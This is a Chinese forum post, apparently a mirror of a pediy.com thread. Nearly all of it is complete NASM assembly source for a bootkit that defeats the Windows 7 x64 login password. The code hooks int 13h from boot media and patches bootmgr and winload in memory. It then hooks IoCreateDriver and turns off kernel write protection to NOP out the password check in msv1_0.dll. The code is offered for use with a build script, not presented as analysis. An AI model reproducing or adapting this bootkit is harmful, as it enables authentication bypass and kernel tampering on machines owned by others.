
# `bootkit`过64位Windows 7用户密码

> 原文：[`www.pediy.com/kssd/pediy12/129167.html`](https://www.pediy.com/kssd/pediy12/129167.html)

代码中有很多垃圾代码，大家见谅。

代码：

```
#filename bian.bat
@set path=d:\Program Files\nasm;%path%
nasm passx64win7.asm -o loader7x64.bin
```

事先安装好`nasm`编译出的`bin`作为光盘启动文件。

代码：



```assembly
;filename: passx64win7.asm
;16bits code
MBRBASE     equ 0x7c0     ;MBR 被加载到 0x7c00 处
NEWBASE     equ 0x9e00    ;
;32 bits code
LAGERNEWBASE equ 0x9e000  
base32      equ qword 0xfffff8000009f000
Archx86TransferTo64BitApplicationAsmCall equ 0x0043e035; 地址的硬编码，在程序运行时代码会修改此值。
WINLOADPATCH1    equ 0x1265    ; 00000000\`0052f265 call OslLoadImage 
WINLOADPATCH2    equ 0x67c20;   0x595C20  this is blank space offset
WINLOADPATCHEND  equ 0x6660a;0x0470d6 ; ox5945E0 OslArchTransferToKernel address offset 0x594648  59460A
;以上都是硬编码，在程序中哦使用的时候都会被修改。?

use16

BlockStart: 
    jmp main ;跳到主程序

start:
;读取硬盘真实的 MBR
    xor ax, ax
    mov sp, 0x7bff
    mov bx, 0x7c00
    ;mov bx, MBRBASE
    mov es, ax    ; read to es:bx
    mov ax, 0x201    ; ah=2 - read sectors, al - sectors num
    mov cx, 1    ; sector  from Harddisk boot
    mov dx, 0x80    ; hdd
    int 0x13
    jmp 0:0x7c00

;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  

intHandler: ;hook function base adress    此处是新的 int13 的入口
        pushf
    cmp ah, 0x42
        jz processint13request
        cmp ah, 0x2
        jz processint13request
        popf
        jmp 0x0:0x0 ;jmp back to original handler;thse zero are filled above 修改为真实的 int13 入口
INT13INTERRUPTVALUE EQU $-4 

processint13request:
        mov [cs:STOREAH], ah
        popf
        pushf
    call far [cs:INT13INTERRUPTVALUE] ;this jumps back to original int13 ivt
        jc returnback ;since request failed just go back
        pushf
        cli
        push es
        pusha
        mov ah, 0x0       ;   this zero gets fillled by original ah code passed
STOREAH EQU $-1      
        cmp ah, 0x42
        jnz notextrequest
        lodsw
        lodsw
        les bx, [si]
       
notextrequest:
        test al, al
        jng scandone
        cld
        mov cl, al
        mov al, 0x4d
        shl cx, 0x9
        mov di, bx
scanloop:
        repne scasb
         
        jnz scandone
        cmp dword [es:di], 0x300905a;  0x74f685f0     ;加载到 MZ 的时候 16Bits code 已经加载完毕。
        jnz scanloop
        cmp word [es:di+0x4], 0x0 
        jnz scanloop
         
    pushad
    pushf     
        push 0x2000;
        pop es
        push NEWBASE  ; Setup the Data Segment register
        pop ds     
        mov si, BOOTMGR\_16\_BIT\_PATCH\_STARTS
        mov di, 0xa8c    ; this is the offset of code which jumps to bootmgr\_main 
         mov cx, BOOTMGR\_16\_BIT\_PATCH\_ENDS - BOOTMGR\_16\_BIT\_PATCH\_STARTS 
         rep movsb
        push 0
        pop es
        mov eax, [ds:INT13INTERRUPTVALUE]
        mov [es:13h*4], eax
        ;修复 13h  中断
    popf
     popad
         
scandone:            ;pop pushed registers and get out
        popa
        pop es
        popf
returnback:   
       retf 0x2
       
BOOTMGR\_16\_BIT\_PATCH\_STARTS: ;bootmgr 跳转到 32bits 之前的 16bits 结尾跳转到自己的补丁处
;push  CODEBASEIN1MBEXACT + BOOTMGR\_PATCHER\_STARTS - 0x20000
;ret
  db 0x66, 0xbb
  dd  LAGERNEWBASE + BOOTMGR\_PATCHER\_STARTS
  db 0x90
BOOTMGR\_16\_BIT\_PATCH\_ENDS:

USE32
;########################################################
;##  32 bit Code, is called before execution of BOOTMGR  ##
;########################################################
CODE32START:    
BOOTMGR\_PATCHER\_STARTS:
;mov dword [cs:0xa93], 0
;jmp $
push edx
push ebp
pushad
pushf
;mov byte [Archx86TransferTo32BitApplicationAsm], 0xcc
;find Archx86TransferTo64BitApplicationAsmCall
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov edi, 0x430000
    mov ecx, 0xF000 ;地址空间大小
    mov al, 0xe8
  scan\_loop\_a:
    ; ff 15 59 00 03 00 48 3b c6 0f 85 c0 b8 00 00 
    repne scasb   
    mov ebx, [edi]
    add ebx, edi
    add ebx, 4
    test ecx, ecx
    jz endloopa
    cmp  Dword [ebx], 0x53575655
    jne  scan\_loop\_a
    cmp Dword [ebx+4], 0x200f1e06
    jne scan\_loop\_a
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

dec edi
mov ax , word [edi] 
mov word [LAGERNEWBASE], ax
mov eax , dword [edi+2] 
mov dword [LAGERNEWBASE+0x2], eax
mov dword [LAGERNEWBASE+0x6], LAGERNEWBASE + WINLOAD\_PATCHER\_STARTS

mov dword [LAGERNEWBASE+0xa], edi

mov word [edi], 0x25ff ;jmp dword []
mov dword [edi+0x2], LAGERNEWBASE+0x6

endloopa:
popf
popad
mov ebx, 0x401000
push ebx
ret


BOOTMGR\_PATCHER\_ENDS:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
WINLOAD\_PATCHER\_STARTS:
;这个代码是在 bootmgr 最后时候执行，修改完恢复补丁出，跳回去；
pushad
pushf

mov ebp, dword [LAGERNEWBASE+0xa]
mov [LAGERNEWBASE+PUSHADDRESS+1], ebp
mov dx, word [LAGERNEWBASE]
mov word [ebp], dx
mov edx, dword [LAGERNEWBASE+0x2]
mov dword [ebp+0x2], edx

;对 winload 的重要 处进行补丁
;patch 1 kernel hook hook IoCreateDriver Function, and patch 
mov dword [LAGERNEWBASE],  LAGERNEWBASE+stager32
mov dword [LAGERNEWBASE+4], 0x0
mov eax, [esp+0x30]
mov edi,  eax

    add edi, 0x1000
    mov ecx, 0xF00 ;地址空间大小
    mov al, 0x4c
  scan\_loop\_b:
   
    ; ff 15 59 00 03 00 48 3b c6 0f 85 c0 b8 00 00 
    repne scasb   
    mov ebx, [edi+2]
    test ecx, ecx
    jz endloopb
    cmp ebx, 0x100000
    jnl scan\_loop\_b
    add ebx, edi
    add ebx, 6
    cmp  dword [ebx], 0x74006e
    jne  scan\_loop\_b
    cmp dword [ebx+4], 0x73006f
    jne scan\_loop\_b
    cmp  dword [ebx+8],  dword 0x72006b; 48 3b c6 0f 85 c0 b8 00
    jne  scan\_loop\_b
    cmp  dword [ebx+0xc],  dword 0x6c006e; 48 3b c6 0f 85 c0 b8 00
    jne  scan\_loop\_b
    mov al, 0xe8
    repne scasb
    add edi, 0x4
    mov ebx, edi
    mov ecx, LAGERNEWBASE-0x6
    sub ecx, ebx
mov [LAGERNEWBASE +  WINLOAD\_32\_BIT\_PATCH\_STARTS + 2], ecx
mov esi, LAGERNEWBASE + WINLOAD\_32\_BIT\_PATCH\_STARTS
mov ecx, WINLOAD\_32\_BIT\_PATCH\_ENDS - WINLOAD\_32\_BIT\_PATCH\_STARTS 
rep movsb


endloopb:

popf
popad
PUSHADDRESS:
push Archx86TransferTo64BitApplicationAsmCall
ret
WINLOAD\_PATCHER\_ENDS:

WINLOAD\_32\_BIT\_PATCH\_STARTS:
dw 0x15ff
dd LAGERNEWBASE-0x0052f265-0x6
db 0x90
WINLOAD\_32\_BIT\_PATCH\_ENDS:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
USE64
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ntBase dq 0
stager32:
  push rbx
  push rbp
  push rsi
  push rdi
  push rcx
  ;int3
  push rax
  mov rax, 0xFFFFF6FC000004F8
  mov qword[rax], 0x9e163
  pop rax
;push rax
;mov rax, cr3
;mov rax, qword[rax+0x1f0*8] 
;and eax, 0xfffff000   
;mov rax, qword[rax+0x0*8]
;and eax, 0xfffff000
;mov rax, qword[rax+0x0*8]
;and eax, 0xfffff000
;add rax, 0x9f*8
;mov qword [rax], LAGERNEWBASE + 0x183
;pop rax   

  mov [ntBase+LAGERNEWBASE],  rbx
  call payload     
  ;popad
  ; 恢复正常 WinLoad 代码
   

pop rcx
pop rdi
pop rsi
pop rbp
pop rbx
;ret
;flag1:   
movsxd rbx, eax
xor eax, eax
cmp ebx, eax
ret
;
iniFcnToHookHash equ word 0E663h  ; IoCreateDriver

stagerSize equ (stagerEnd-stager)

payload:


  push rax
  push rbx
  push rcx
  push rsi
  push rdi
   

  mov bx, iniFcnToHookHash ;IoCreateDriver
  call GetProcAddressKernel
   
  xor rcx, rcx
  mov rsi, rax        
  mov rdi, LAGERNEWBASE+residentEnd  ; 保存入口处代码，
  mov rcx,  stagerSize
  rep movsb

  mov rsi, stager+LAGERNEWBASE    ; a misto ni tam dame stager
  mov rdi, rax
  mov rcx, stagerSize
  call memcpy
   
  pop rdi
  pop rsi
  pop rcx
  pop rbx   
  pop rax
   

  ret

; ############################################################################

stager:
  mov rax, \_stager+base32
  call rax      ; 7 bytu
stagerEnd:
; ############################################################################

\_stager:
  sub qword[rsp],  stagerSize  ; 
  push rcx
  push rdx
  push r8
  push r9
  push rbx
  sub rsp, 0x20
  ;int3
  mov bx,  word 0A353h    ; hash PsSetLoadImageNotifyRoutine=0E14EA353h
  call GetProcAddressNt
  mov rcx, PspLoadImageNotifyRoutine + base32
  call rax  ; registrujeme handler "on image loaded"
  .stagerRemove:
  mov rsi, base32+residentEnd  ; 恢复 IoCreateDriver
  mov rdi, [rsp+0x48]    ; 
  xor rcx, rcx
  mov ecx,  stagerSize    ; 
  call memcpy
  ;int3
  add rsp, 0x20
  pop rbx
  pop r9
  pop r8
  pop rdx
  pop rcx
  ret

;
; dt \_UNICODE\_STRING poi(esp+4)
PspLoadImageNotifyRoutine:
   
  push rax
  push rbx
  push rcx
  push rdx
  push rsi
  push rbp
  push rdi
  ;mov rbp, base32
  ;int3
  .isItMsv1\_0:
  mov rax, rcx ;\_UNICODE\_STRING {length:2,maxLength:2,pBuffer:4}
  mov rcx, 20    ; 宽字符 "msv1\_0.dll"
  mov rsi, qword[rax+8]
  xor rdx, rdx
  mov dx, word[rax]
  add rsi, rdx
  sub rsi, rcx    ; 转换成 ASCII
  xor rax, rax
  cdq
  @hash: lodsb    ; hash
  ror edx, 0xd
  add edx, eax
  loop @hash
  cmp dx, 6399h
  jne die
  ;FALG1:
  ;jmp FALG2
    mov rbp, base32
    mov rbx, [r8+0x8]
    ;mov rbx, rbp; qword [rbp+PspLoadImageNotifyRoutine-8]
    mov rdi, rbx
    add rdi, 0xF000
    mov rcx, 0xF00 ;地址空间大小
    mov al, 0ffh
  scan\_loop\_s:
   
    ; ff 15 59 00 03 00 48 3b c6 0f 85 c0 b8 00 00 
    repne scasb   
    test ecx, ecx
    jz endloop
    cmp  byte [rdi], 15h
    jne  scan\_loop\_s
    cmp Dword [rdi+1], 0x00030059
    jne scan\_loop\_s
    cmp  dword [rdi+5],  dword 0x0fc63b48; 48 3b c6 0f 85 c0 b8 00
    jne  scan\_loop\_s
    cmp  dword [rdi+9],  dword 0x00b8c085; 48 3b c6 0f 85 c0 b8 00
    jne  scan\_loop\_s
  ;int3
  mov rbx, cr0
  mov rdx, rbx
  and ebx, 0FFFEFFFFh   
  mov cr0, rbx
  mov [rdi+5], dword 0x90909090
  mov [rdi+5+4], dword 0x90909090
  mov byte[rdi+5+8], 0x90
  mov cr0, rdx
  endloop:
  mov [rbp + PspLoadImageNotifyRoutine],  dword 0x909090c3 ;这个回调用完后销毁 Ret 0c;


  die:
  pop rdi
  pop rbp
  pop rsi
  pop rdx
  pop rcx
  pop rbx
  pop rax
  ret 
   
;(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
;  UTILS
;(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((

;
; edi - destination
; esi - source
; ecx - bytesNr
;
memcpy:
  push rbx
  push rdx
   
  mov rbx, cr0
  mov rdx, rbx
  and ebx, 0FFFEFFFFh  ; bit 16 - odstrani write protect
  ;btr ebx, 16    ; store selected bit in CF and clear
  mov cr0, rbx
   
  rep movsb
   
  mov cr0, rdx
   
  pop rdx
  pop rbx
  ret   
   
;
; Vypocte ror hash.
; esi - null terminated string
; edx - computed hash
; nuluje eax
;
rorHash:
  xor eax, eax
  cdq
.hash:  lodsb
  ror edx, 0xd
  add edx, eax
  test al, al
  jnz .hash
  ret

;
GetProcAddressKernel:
  push rbp
  mov rbp, qword [ntBase+LAGERNEWBASE]
  jmp GetProcAddress
GetProcAddressNt:
  push rbp
  mov rax, ntBase+base32
  mov rbp, qword[rax]  ; hledame jen v ntoskrnl
GetProcAddress:
  push rdx
    push rcx
    push rdi
    push rbx
    push rsi
;   push rbp    
    
  xor rcx, rcx
  mov edi, dword [rbp+0x3c]
  mov edi, dword [rbp+rdi+0x88]  ; DataDirectory[0=EAT]{VirtualAddress, Size} to get offset to export table   ; this value is 0x78 for 32 bit executables
  add rdi, rbp
.fcn:
  xor rdx, rdx
  mov edx, dword [rdi+0x20]  ; IMAGE\_EXPORT\_DIRECTORY.AddressOfNames
  add rdx, rbp
  mov esi, [rdx+rcx*4]
  add rsi, rbp    ; rsi=FcnName
  call rorHash
  inc rcx
  cmp dx, bx
  jnz .fcn ;don't find it go on 
  dec rcx
   
  mov ebx, [rdi+0x24]  ; IMAGE\_EXPORT\_DIRECTORY.AddressOfNameOrdinals
  add rbx, rbp
  mov cx, [rbx+rcx*2]  ; ordinal
  mov ebx, [rdi+0x1c]  ; IMAGE\_EXPORT\_DIRECTORY.AddressOfFunctions
  add rbx, rbp
  mov eax, [rbx+rcx*4]  ; AddressOfFunctions[ordinal]
  add rax, rbp; eax is adress
    pop rsi
    pop rbx
    pop rdi
    pop rcx
    pop rdx
  pop rbp
   
  ret

residentEnd:   
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CODEBASE\_CHANGE\_START\_BITS:

CODEBASE\_CHANGE\_END\_BITS:
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   
use16     
BootSec dw 0
BlockEnd:
main:
;不详细解释每一行代码的详细功能了
  cli
  push 0
  pop es ;设置 es 段为 0 
  mov eax, [es:13h*4]
  push MBRBASE
  pop ds
;hook int13 中断
  mov dword[ds:INT13INTERRUPTVALUE], eax
  mov [es:13h*4], word intHandler
  mov [es:13h*4+2], word NEWBASE
  sti
   
  push NEWBASE  
  pop es  ;config es section is base NEWBASE
  xor di, di ;cls di

  mov si, 0
  mov ecx, BlockEnd-BlockStart ;长度
  rep movsb ;复制整个代码段到新的内存段

  jmp NEWBASE:start ;jmp new section 跳转到新的代码段
   
times 2048-($-$$) db 0   
```



`http://bbs.pediy.com/showthread.php?t=128697`
